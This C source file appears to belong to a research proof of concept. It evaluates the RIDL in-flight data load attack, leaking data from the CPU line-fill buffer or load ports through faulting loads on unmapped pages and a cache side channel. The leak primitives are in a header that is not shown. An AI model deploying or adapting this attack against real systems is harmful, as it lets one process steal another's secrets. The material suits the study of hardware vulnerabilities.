// evaluate the rogue in-flight data load attack

#include "common.h"

#include <cpuid.h>
#include <stdint.h>
#include <string.h>
#include <sys/user.h>
#include <unistd.h>

// possible settings:
// FAULT_UNMAPPED: avoid fault using paged-out page
// TARGET_LFB, TARGET_LP: leak from line-fill buffer or load ports

#if defined(TARGET_LFB) == defined(TARGET_LP)
#error "Invalid target definition"
#endif

void attacker(void) {
    // prepare cache-based transmission channel
    transmit_t transmit;
    transmit_prepare(&transmit);

    // we need an unmapped page, either paged-out or invalid
#ifdef FAULT_UNMAPPED
    page_t *unmapped = mmap_pages(1);
#else
    void *unmapped = NULL;
#endif

    for (size_t i = 0; i < SAMPLE_COUNT; i++) {
        for (size_t j = 0; j < COUNTS_PER_SAMPLE; j++) {

#ifdef FAULT_UNMAPPED
            // make sure the page is paged-out
            mmap_evict(unmapped, 1);
#endif

#ifdef TARGET_LFB
            // to leak from the line-fill buffer, access the beginning of the cacheline
            void *target = unmapped;
#else
            // to leak from the load ports, issue a load spanning two cachelines
            void *target = (uint8_t *)unmapped + CACHELINE_SIZE - 1;
#endif

            transmit_leak_start(&transmit);
            leak_and_transmit(&transmit, target);
            transmit_leak_end(&transmit);

            transmit_receive(&transmit);
        }
        transmit_decode(&transmit);
    }

    transmit_display(&transmit);
}
